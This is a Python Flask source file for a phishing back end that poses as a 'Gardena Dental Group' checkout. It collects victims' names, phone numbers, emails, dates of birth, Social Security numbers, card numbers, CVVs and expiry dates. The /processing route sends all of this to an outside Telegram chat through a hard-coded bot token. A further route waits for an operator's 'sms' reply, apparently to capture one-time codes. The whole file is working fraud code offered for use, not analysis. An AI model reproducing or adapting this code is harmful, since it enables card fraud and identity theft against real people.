from flask import Flask, request, session, redirect
from flask import Flask, render_template
import uuid
import telegram

app = Flask(__name__)
app.secret_key = 'your_secret_key'
bot_token = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U'
chat_id = '-4104959417'
bot = telegram.Bot(token=bot_token)



@app.route('/processing', methods=['POST'])
def processing():
    form_uid = str(uuid.uuid4())
    session['form_uid'] = form_uid
    print(f"Set form_uid in session: {form_uid}")
    card_number = request.form['cardNumber']
    cvv = request.form['cvv']
    expiry = request.form['expiryDate']
    session['cvv'] = cvv
    session['expiryDate'] = expiry
    session['cardNumber'] = card_number
    phone_number = session['phone']
    first_name = session['first_name']
    last_name = session['last_name']
    cardHolderName = session['cardHolderName']
    email = session['email']
    dob = session['dob']
    ssn = session['ssn']
    ip_address = session['ip_address']
    user_agent = session['user_agent']
    card_number = session['cardNumber']
    cvv = session['cvv']
    expiry = session['expiryDate']
    form_uid = session['form_uid']

    msg = f"Gardena Dental Group - \n\nFirst Name : {first_name}\nLast Name : {last_name}\nPhone Number : {phone_number}\nEmail : {email}\nDate of birth : {dob}\nSSN : {ssn}\n\nCardHolder Name : {cardHolderName}\nCreditCard Number : {card_number}\nCVV : {cvv}\nExpiry Date : {expiry}\n\nIP Address : {ip_address}\nUser Agent : {user_agent}\n\n"
    print(msg)
    
    sendok = send_msg_enter_sms(msg, chat_id, form_uid)
    if sendok:
        return render_template('waitpage_1.html', session=session, form_uid=form_uid)
    else:
        return "Error sending message"


@app.route('/checkout')
def form():
    cardHolderName = session.get('first_name', '') + ' ' + session.get('last_name', '')
    cardHolderName = cardHolderName.strip()
    session['cardHolderName'] = cardHolderName
    return render_template('form.html', session=session)


@app.route('/set_data', methods=['GET', 'POST'])
def set_data():
    if request.method == 'GET':
        data = {
            'first_name': request.args.get('first_name', ''),
            'last_name': request.args.get('last_name', ''),
            'phone': request.args.get('phone', ''),
            'email': request.args.get('email', ''),
            'dob': request.args.get('dob', ''),
            'ssn': request.args.get('ssn', ''),
            'ip_address': request.args.get('ip_address', ''),
            'user_agent': request.args.get('user_agent', ''),
        }
        session.update(data)
        return redirect('/checkout')




@app.route('/send_message', methods=['POST'])
def send_message():
    chat_id = '-4104959417'
    
    response = bot.send_message(chat_id, text='Unesite poruku "sms" ako želite da pređete na sledeću stranicu.')
    session['waiting_for_response'] = True
    return 'Poruka poslata na Telegram.'


@app.route('/process_response', methods=['POST'])
def process_response():
    if 'waiting_for_response' in session and session['waiting_for_response']:
        message_text = request.form['message_text']
        if message_text.lower() == 'sms':
            session.pop('waiting_for_response', None)
            return 'Uspešno prešli na sledeću stranicu.'

    return 'Odgovor nije "sms" ili nije bila očekivana interakcija.'

if __name__ == '__main__':
    app.run(debug=True)
